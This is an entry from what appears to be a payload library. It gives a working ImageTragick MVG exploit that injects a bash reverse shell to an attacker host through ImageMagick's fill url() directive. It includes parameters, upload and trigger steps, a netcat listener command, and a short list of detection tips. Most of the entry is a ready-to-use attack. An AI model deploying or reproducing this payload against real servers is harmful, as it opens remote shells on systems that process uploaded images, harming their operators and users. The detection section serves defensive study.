---
id: 0d5af7ff-6c7a-42ce-b194-4a2cc5ce67d9
name: ImageMagick-MVG-RCE-Reverse-Shell
type: code
language: mvg
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - rce
  - payload
  - imagemagick
validated: true
---

# ImageMagick-MVG-RCE-Reverse-Shell

## Code

```mvg
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```

## Description

This MVG payload exploits the ImageTragick vulnerability by embedding a bash reverse shell in the 'fill' directive. When processed by vulnerable ImageMagick, it executes the command to connect back to the attacker and create a 'hello' file as a persistence indicator.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| attacker-ip | IP address of the attacker's listener | 192.168.1.100 |
| attacker-port | Port where netcat or similar is listening | 4444 |

## Usage

Save this as a .mvg or .jpg file and upload to a vulnerable server. Trigger processing via convert or identify commands. Set up a listener (e.g., nc -lvnp 4444) beforehand. Used in file upload RCE scenarios against web apps using ImageMagick for image handling.

## Detection

- Monitor ImageMagick logs for MVG parsing errors or URL fetches to internal/external hosts.
- Scan uploads for 'push graphic-context', 'url()', or pipe characters.
- Network monitoring for outbound connections from image processing processes.
- File system checks for anomalous files like 'hello' in upload directories.

## Related

- [[procedures/ImageMagick-RCE-via-Malicious-MVG-Upload]]
